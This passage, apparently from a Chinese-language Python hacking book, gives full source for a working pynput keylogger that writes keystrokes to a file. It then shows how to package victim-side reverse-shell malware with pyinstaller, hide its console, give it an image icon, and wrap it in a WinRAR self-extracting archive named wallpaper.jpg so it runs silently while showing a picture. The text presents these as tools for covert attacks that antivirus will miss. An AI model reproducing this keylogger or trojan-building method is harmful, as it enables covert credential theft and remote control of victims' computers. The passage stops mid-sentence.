  \n图 7.7 – 在 Windows PC 上截取的屏幕截图\n\n在本节中，我们学习了如何使用黑客程序截取受害者电脑的屏幕，以及如何将文件传输到黑客电脑。在下一节中，我们将学习如何创建键盘记录器来跟踪受害者的击键。\n\
  \n## 键盘记录器\n\n在本节中，我们将构建一个简单的键盘记录器。键盘记录器是一种记录用户击键的恶意软件程序。它是最常见的恶意软件类型之一。键盘记录器通常用于窃取密码和其他敏感信息，例如信用卡。键盘记录器通常被设计为尽可能安静，这意味着键盘记录器非常难以检测。让我们尝试构建一个简单的键盘记录器。你需要安装一个名为\
  \ pynput 的模块来构建键盘记录器。该模块允许你以编程方式访问击键：\n\n- 1. 要安装此模块，请使用以下命令：\n```\npip install\
  \ pynput\n```\n这将安装该模块：\n- 2. 安装模块后，我们可以从该模块导入 keyboard：\n```\nfrom pynput import\
  \ keyboard\n```\n- 3. 接下来，我们将定义一个用于监听击键的监听器。该监听器将在不同事件上处理不同的情况。看一下以下代码：\n```\nwith\
  \ keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:\n    listener.join()\n\
  ```\n\n```\npip install pynput\n```\n\n```\nfrom pynput import keyboard\n```\n\n\
  ```\nwith keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:\n\
  \    listener.join()\n```\n\n之前的代码为按键的 *按下* 和 *释放* 定义了两个函数。当按下键时，将调用 onPress 函数，当释放键时，将调用\
  \ onRelease 函数。\n\n4. 现在我们将定义这些函数。让我们看一下这些函数：\n\n```\ndef onPress(key):\n    print(str(key))\n\
  \ndef onRelease(key):\n    if str(key) == 'Key.esc':\n        return False\n```\n\
  \n我们定义了非常简单的函数。当我们按下键时，我们简单地打印它，当键被释放时，我们检查按下了哪个键。如果按下的键是 *Esc* 键，我们退出程序，否则继续。这样，我们有一个退出条件，不会被卡住。如果我们不定义此条件，就无法退出程序，因为按下\
  \ *Ctrl + C* 只会打印它而不是退出。为了安全地返回此函数，我们返回 False 值。让我们看一下简单的执行情况：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_164_0.png)\n\
  \n图 7.8 – 打印按下的键\n\n在此屏幕截图中，我们在程序执行期间打印了按下的键。当我们按下 *Esc* 键时，它退出了程序。这就是一个非常基本的键盘记录器的全部内容。然而，在实际情况下，你将在受害者机器上运行此程序，因此仅在控制台上打印并不是很有帮助。理想情况下，我们希望保留这些击键的日志。许多键盘记录器将击键存储在文件中，黑客可以检索并查看是否输入了任何密码或其他敏感信息。\n\
  \n5. 现在我们将对键盘记录器进行更改，使其更有用。让我们创建一个新的文件名，keylogs.txt。\n\n我们将在此文件中存储日志。让我们看一下代码：\n\
  \n```\nimport sys\nfilename = \"keylogs.txt\"\n\nfile = open(filename, \"w\")\n\
  def onPress(key):\n    print(str(key))\n    file.write(str(key))\n\ndef onRelease(key):\n\
  \    if str(key) == 'Key.esc':\n        file.close()\n        sys.exit(0)\n```\n\
  \n这里我们在写模式下创建一个文件，每次按下键时，我们都会将键存储在文件中。最后，当按下 Esc 键时，我们关闭文件并退出。如果你启动程序并运行它并按下一些键，你会看到创建了一个新文件，并且所有键日志都存储在文件中。这是我的执行结果：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_165_0.png)\n\n图 7.9 – 存储在文件中的击键\n\n6.\
  \ 你可以在前面的屏幕截图中看到，每个字符周围都有引号。我们可以删除这些引号以提高可视性。为了替换它，我们可以更新以下代码：\n\n```\ndef onPress(key):\n\
  \    print(str(key))\n    stroke = str(key).replace(\"'\", \"\")\n    if str(key)\
  \ == \"Key.esc\":\n        file.write(\" \")\n    else:\n        file.write(stroke)\n\
  ```\n\n这里，我们做了两个更改。首先，我们在写入文件之前将单引号替换为空字符串，其次，如果键是 Esc，我们不将其写入文件。现在，如果你运行程序，你会看到它只注册字符。\n\
  \n如果你按下任何特殊键，例如 Enter 或空格，你会看到程序注册其名称而不是其功能，这不是我们想要的。我们希望在用户按下空格按钮时看到一个空格。为此，我们将添加以下更改：\n\
  \n```\ndef onPress(key):\n    print(str(key))\n    stroke = str(key).replace(\"\
  '\", \"\")\n    if str(key) == \"Key.space\":\n        file.write(\" \")\n    elif\
  \ str(key) == \"Key.enter\":\n        file.write(\"\\n\")\n    elif str(key) ==\
  \ \"Key.esc\":\n        file.write(\" \")\n    else:\n        file.write(stroke)\n\
  ```\n\n\n\n\n7. 我们的键盘记录器已基本完成。我们只需再添加最后一个修改。我们的键盘记录器不支持退格键。要添加此功能，请看下面的代码：\n\n```\n\
  import os\n    elif str(key) == \"Key.backspace\":\n        file.seek(file.tell()-1,\
  \ os.SEEK_SET)\n        file.write(\"\")\n```\n\n这段代码会检测退格键，如果遇到退格键，我们就向后移动一个字符，并在那里写入一个空字符串。这会替换文件中已存储的现有字符。现在，我们的基础键盘记录器已经完成。它既支持字符插入，也支持退格记录功能。键盘记录器的完整代码如下：\n\
  \n```\nfrom pynput import keyboard\nimport sys\nimport os\n\nfilename = \"keylogs.txt\"\
  \n\nfile = open(filename, \"w\")\n\n\ndef onPress(key):\n    print(str(key))\n \
  \   stroke = str(key).replace(\"'\", \"\")\n    if str(key) == \"Key.space\":\n\
  \        file.write(\" \")\n    elif str(key) == \"Key.enter\":\n        file.write(\"\
  \\n\")\n    elif str(key) == \"Key.esc\":\n        file.write(\" \")\n    elif str(key)\
  \ == \"Key.backspace\":\n        file.seek(file.tell()-1, os.SEEK_SET)\n       \
  \ file.write(\"\")\n    else:\n        file.write(stroke)\n```\n\n```\ndef onRelease(key):\n\
  \    if str(key) == 'Key.esc':\n        file.close()\n        sys.exit(0)\nif __name__\
  \ == \"__main__\":\n    with keyboard.Listener(on_press=onPress, on_release=onRelease)\
  \ as listener:\n        listener.join()\n```\n\n在本节中，我们学习了如何部署一个简单的键盘记录器。以此为基础，你可以编写一个更高级的键盘记录器。\n\
  \n## 总结\n\n在本章中，我们学习了如何为我们的基础恶意软件添加高级功能。首先，我们增加了从受害者到客户端的文件传输支持，然后添加了附加功能，例如截取受害者机器的屏幕截图并将其发送回黑客。最后，我们构建了自己的键盘记录器。每天都有成千上万的恶意软件被编写出来，杀毒软件努力跟上它们的检测步伐。自己编写恶意软件的优势在于，由于它由你编写，且尚不存在于杀毒软件数据库中，杀毒软件并不容易检测到它。这让你有更大机会成功发动攻击。使用我们在本章中开发的工具，你将理解如何构建更高级的恶意软件，以及如何随心所欲地为其添加更多功能。通过编写自定义恶意软件所获得的技能，将为你提供更多隐蔽攻击的机会，并减少被杀毒软件检测到的可能。\n\
  \n在下一章中，我们将了解如何将代码打包成单个可执行文件，以及如何将其用于黑客攻击。下一章见！\n"
- "# 8\n\n## 后渗透\n\n在第 7 章“高级恶意软件”中，我们学习了如何为恶意软件程序添加一些高级功能。你可以根据自己的需要为恶意软件添加任意数量的功能。代码编写完成后，接下来就是实现部分。你如何打包恶意软件并使其便于部署？在本章中，我们将了解恶意软件部署的以下方面：\n\
  \n- 打包恶意软件\n- 了解木马\n- 通过公网 IP 发起攻击\n- 破解密码\n- 窃取密码\n- 创建僵尸网络\n\n### 打包恶意软件\n\n我们在第\
  \ 7 章“高级恶意软件”中开发的程序是一个 Python 文件，它还包含一些依赖项。在没有物理访问权限的情况下，很难在受害者的机器上运行 Python 文件。这使得我们的程序不太实用，除非我们有办法将所有内容打包成一个可执行文件，将其发送给受害者；当受害者打开它时，它会向黑客的电脑建立反向\
  \ shell。\n\n将 Python 代码打包成可执行文件，需要同时包含程序的所有依赖项。这正是我们使用*虚拟环境*的原因。虚拟环境使程序能够将所有依赖项保存在一起，这样当我们打包代码时，包括\
  \ Python 解释器在内的一切都会被包含在可执行文件中，因此我们无需在受害者电脑上安装任何东西，程序即可完美运行。\n\n### 了解 pyinstaller\
  \ 库\n\n幸运的是，有一种方法可以实现上述目标。这需要使用一个名为 `pyinstaller` 的 Python 库。它可以帮助我们将代码打包成一个漂亮的二进制可执行文件，在\
  \ Windows 上扩展名为 `.exe`。要安装 `pyinstaller`，请执行以下命令：\n\n```\npip install pyinstaller\n\
  ```\n\n请注意，此命令应在启用虚拟环境的情况下安装，以便我们拥有所有必需的依赖项。打开你的高级恶意软件（受害端程序）并启用虚拟环境。完成后，使用上述命令安装\
  \ `pyinstaller`。\n\n如果你还没有创建虚拟环境，可以在 Python 恶意软件文件所在的文件夹中运行以下命令来创建它：\n\n```\npython\
  \ -m venv myenv\n```\n\n稍等片刻，等待安装完成。完成后，你可以通过启动一个新终端，或在脚本文件夹或 `myenv` 中运行 `activate.bat`\
  \ 脚本，来激活环境。\n\n如果你成功激活了 Python 环境，你将看到类似下面的内容：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_170_0.png)\n\
  \n图 8.1 – Python 环境已启用\n\n请注意，我们在高级恶意软件中使用了一个外部依赖项 `pyautogui`。我们也需要将这个依赖项安装到虚拟环境中。如果你的恶意软件添加了任何其他需要外部依赖项的功能，也请一并安装。所有依赖项安装完成后，就可以在虚拟环境中使用\
  \ `pip install pyinstaller` 安装 `pyinstaller`。如果一切操作正确，在命令终端中输入 `pyinstaller`，你应该会看到以下输出：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_171_0.png)\n\n图 8.2 – pyinstaller 安装\n\
  \n在图 8.2 中，你可以看到 pyinstaller 的可用选项列表。接下来，要生成可执行文件，请输入 pyinstaller -onefile advanced_malware.py。这会将所有代码及其依赖项编译成单个文件，并创建如下文件夹结构：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_171_1.png)\n\n图 8.3 – 文件夹结构\n\n你需要注意的文件夹是\
  \ dist 文件夹，它代表 distribution（分发）。你的可执行文件将位于此处。继续，在文件资源管理器中打开这个文件夹：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_171_2.png)\n\
  \n图 8.4 – 可执行文件\n\n你会发现一个与你的 Python 文件名同名的可执行文件，其扩展名为 .exe。现在，如果你在黑客程序运行的同时直接运行这个文件，你就会收到一个反向连接。无论受害者系统上是否安装了\
  \ Python，这个可执行文件都能正常运行。继续，运行你的黑客程序，然后双击这个可执行文件将其打开。黑客程序将显示如下：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_172_0.png)\n\
  \n类似地，在受害者的电脑上，你会看到一个带有类似界面的控制台弹出窗口：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_172_1.png)\n\
  \n如果你仔细查看图 8.6 的顶部，会看到正在运行的可执行文件的名称。你可以清楚地看到，现在运行的是一个可执行文件，而不是 Python 脚本，同时达到了相同的目标。\n\
  \n不过，这里有一个小问题。如果受害者点击这个可执行文件，他们会看到一个命令提示符弹出，显示正在发生的一切，这显然不是我们想要的，因为这会提醒受害者有事情正在发生。我们希望这一切在后台进行，让受害者完全不知道发生了什么。为了隐藏控制台，我们可以向命令添加以下参数：\n\
  \n```\npyinstaller --onefile --noconsole advanced_malware.py\n```\n\n\n\n\n\n如果在黑客程序运行时现在点击可执行文件，你会看到屏幕上没有任何反应，因为没有弹出控制台窗口，不过连接会在后台建立。你可以通过打开任务管理器来查看可执行文件是否在后台运行：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_173_0.png)\n\n图 8.7 – 后台进程\n\n在前面的截图中的后台进程中，你可以看到程序正在运行，并且连接将被建立。请注意，如果你的程序在受害者机器上不能正确运行命令，请前往你的受害者程序，在你执行系统命令的地方添加以下参数：stdin=subprocess.DEVNULL。完整的命令将如下所示：\n\
  \n```\noutput = subprocess.run([\"powershell.exe\", hacker_command], shell=True,\
  \ capture_output=True, stdin=subprocess.DEVNULL)\n```\n\n出现此错误的原因是控制台的标准输入未得到妥善处理。如果你运行黑客程序上的任何命令，它应该能正常运行。以下示例是我运行\
  \ dir 命令的情况：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_174_0.png)\n\n图 8.8 – 在“noconsole”模式下执行命令\n\
  \n现在我们已经创建了一个相当隐蔽的恶意软件，它可以在受害者计算机上后台运行，并让我们控制受害者 PC。但这个程序仍有一个小问题，即它需要用户点击恶意软件可执行文件，这取决于受害者，难度可能不同或容易。如果用户不是很懂技术，你可以很容易地诱骗他们运行它，否则会很困难。现在我们将讨论转向特洛伊木马以及它们的工作原理。我们将在下一节中构建一个小型特洛伊木马恶意软件。\n\
  \n## 理解特洛伊木马\n\n在上一节中，我们创建了一个可执行文件，可以单次点击运行，然后你将与受害者建立反向连接，但这需要受害者手动打开并点击可执行文件。这里就出现了特洛伊木马的概念。特洛伊木马是一种以非常不起眼的方式隐藏的恶意软件程序。通常，这些特洛伊木马恶意软件会与合法软件合并或捆绑在一起，并在受害者尝试打开合法应用程序或文件时运行。你会发现很多时候，这些病毒会与\
  \ PDF 或图像文件合并。将恶意软件隐藏在特洛伊木马中是一项复杂的工作，因为很多时候，你所学到的技巧会在你所使用的软件的更新中迅速被修补。例如，假设你发现了软件中的一个漏洞，允许你在文件中嵌入恶意软件。除非你是第一个发现此漏洞的人，否则很有可能在一天或两天内就会被修补。\n\
  \n## 为可执行文件添加图标\n\n如果我们查看上一节中开发的可执行文件，它有一个 Python 图标，这可能使其看起来像是一个 Python 可执行文件。这对于黑客目的来说不是很有帮助，因为它很容易被检测到。一个办法是向可执行文件添加图像图标，使其看起来像图像而不是可执行文件。这会让用户看起来像是在点击打开图像，而实际上他们正在运行可执行文件。我们可以使用\
  \ pyinstaller 添加图标。为此，我们需要一个扩展名为 .ico 的图像。\n\n取任意图像并将扩展名转换为 .ico。你可以使用任何在线工具进行转换，应该很容易。我将使用以下示例网站将我的图像转换为\
  \ ICO 格式：online-convert.com。\n\n转换图像后，将转换后的文件放置在受害者恶意软件程序所在的同一目录中。完成后，你可以使用以下命令为可执行文件添加图标。\n\
  \n你可以将文件命名为 icon.ico 并为 pyinstaller 编写以下命令：\n\n```\npyinstaller --onefile --noconsole\
  \ -icon=icon.ico advanced_malware.py\n```\n\n如果打开 dist 文件夹，你会看到，现在可执行文件不再是 Python\
  \ 图标，而是取决于你选择的图像的不同图标。我的文件看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_175_0.png)\n\
  \n在前面的截图中，你可以看到图标现在已经改变，现在很容易诱骗受害者点击此文件。现在如果你点击此文件，你会看到它会建立到黑客的后台连接，你可以通过 Windows\
  \ 中的任务管理器进行验证。\n\n## 创建你自己的特洛伊木马\n\n前面的特洛伊木马在某些情况下会起作用，应该足够了。然而，当用户点击后受害者计算机上没有任何反应时，用户可能会猜到有些不对劲。理想情况下，我们希望用户点击可执行文件时打开一个图像，并同时建立回黑客的连接。这样，用户认为他们只是打开了图像，而实际上，他们打开了图像并同时创建了到黑客的反向\
  \ shell。在本节中，我们将尝试进一步隐藏我们的恶意软件。\n\n要创建恶意软件特洛伊木马，你需要四项内容，如下所示：\n\n- 1. 带有图标的恶意软件可执行文件\n\
  - 2. *WinRAR* 程序\n- 3. 用于图标的图像，格式为 .jpg\n- 4. 带有 .ico 扩展名的图标图像\n\n从此网站安装 *WinRAR*\
  \ 软件：https://www.win-rar.com/。\n\n过程应该很简单。完成后，将可执行文件（1）、图像（3）和图标（4）复制到一个新文件夹中。我创建了一个名为\
  \ trojan 的新文件夹并将所有三项粘贴在其中：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_176_0.png)\n\
  \n图 8.10 – 特洛伊木马内容\n\n第一个 advanced_malware.exe 是可执行文件，第二个是图标文件，第三个是用于图标的 .jpg 图像。\n\
  \n现在选择所有三个文件，右键单击选择添加到压缩文件选项：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_177_0.png)\n\
  \n图 8.11 – 添加到压缩文件\n\n这将打开一个新的对话框。它看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_178_0.png)\n\
  \n图 8.12 – WinRAR 对话框\n\n让我们将文件重命名为 wallpaper.jpg。选择压缩方式为最佳，并勾选创建 SFX 压缩包框。现在进入高级选项卡并打开\
  \ SFX 选项。\n\n它将打开一个新的对话框。进入更新选项卡并选择提取并更新文件和覆盖所有文件：\n\n然后进入模式选项卡并勾选解压到临时文件夹，并同时选择隐藏所有以实现静默模式：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_180_0.png)\n\n图 8.15 – SFX 模式\n\n最后，进入设置选项卡并在提取后运行字段中写入以下内容：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_180_1.png)\n\n图 8.16 – 提取后运行\n\n这将允许我们在提取完成后按顺序运行文件。首先，我们将打开向受害者显示的实际图像，并在后台同时运行恶意软件，这将为黑客提供反向连接。\n\
  \n现在一切都已按我们的需求设置好。只需点击确定创建压缩文件，它将在同一文件夹中创建一个名为 wallpaper.jpg 的新文件。表面上，它看起来像一个普通的图像文件，但如果你打开它，你会看到它会创建反向连接，如果你正在运行黑客服务器：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_181_0.png)\n\n图 8.17 – 特洛伊木马\n\n在图 8.16\
  \ 中，你可以看到我们创建了一个名为 wallpaper.jpg 的特洛伊木马。如果你仔细观察，你会看到它具有应用程序类型，但在 Windows 中，扩展名默认是隐藏的，我们已将其命名为\
  \ wallpaper.jpg 使其看起来像图像。并且如果你点击该图像，它将打开图像并同时与黑客建立反向连接。继续自己尝试吧。我们的当前恶意软件攻击到目前为止只在私有\
  \ IP 上起作用。在下一节中，我们将学习如何在公共 IP 上执行相同的攻击。\n\n## 通过公共 IP 进行攻击\n\n到目前为止，我们所做的所有攻击都在本地网络上。这要求你、黑客和受害者连接到同一网络。对于许多攻击场景来说，这可能并非如此。这就是公共\
